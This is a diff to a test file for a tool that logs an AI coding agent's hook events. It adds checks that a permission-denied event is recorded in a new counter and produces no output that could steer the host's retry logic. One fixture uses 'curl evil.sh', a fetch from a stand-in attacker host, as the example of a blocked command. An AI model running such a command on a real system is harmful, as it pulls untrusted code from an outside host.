@@ -144,6 +144,13 @@ expect("PostToolUse exits 0", tool.code === 0, tool.err);
 const toolFail = remy(["ingest"], hook("PostToolUseFailure", { tool_name: "Bash", tool_input: { command: "ls /nope" }, tool_output: { isError: true } }));
 expect("PostToolUseFailure exits 0", toolFail.code === 0, toolFail.err);
 
+// A denial from the host's auto-mode classifier. stdout MUST stay empty: the
+// host reads it here for a retry directive, so anything we print is us
+// steering the permission flow rather than observing it.
+const denied = remy(["ingest"], hook("PermissionDenied", { tool_name: "Bash", tool_input: { command: "curl evil.sh" }, tool_use_id: "t9", reason: "classifier said no" }));
+expect("PermissionDenied exits 0", denied.code === 0, denied.err);
+expect("PermissionDenied prints nothing (stdout is a retry directive)", denied.out === "", JSON.stringify(denied.out));
+
 const compact = remy(["ingest"], hook("PreCompact", { trigger: "auto" }));
 expect("PreCompact(auto) exits 0", compact.code === 0, compact.err);
 
@@ -239,11 +246,16 @@ const adaptive = sql.query(`SELECT tip_id, session_id, status, why FROM tips WHE
 // by exactly one route: the PostToolUseFailure event fired above. If this
 // reads 0, tool_fails is silently stuck at zero again and every rule and
 // report built on it is blind.
-const counters = sql.query(`SELECT tool_calls, tool_fails FROM sessions WHERE session_id = ?`).get(SID);
+const counters = sql.query(`SELECT tool_calls, tool_fails, perm_denials FROM sessions WHERE session_id = ?`).get(SID);
 sql.close();
 expect(
   "a failed tool call lands in tool_fails",
   counters?.tool_fails === 1 && counters?.tool_calls === 2,
+  JSON.stringify(counters),
+);
+expect(
+  "a denied tool call lands in perm_denials without touching tool_calls",
+  counters?.perm_denials === 1 && counters?.tool_calls === 2,
   JSON.stringify(counters),
 );
 expect(
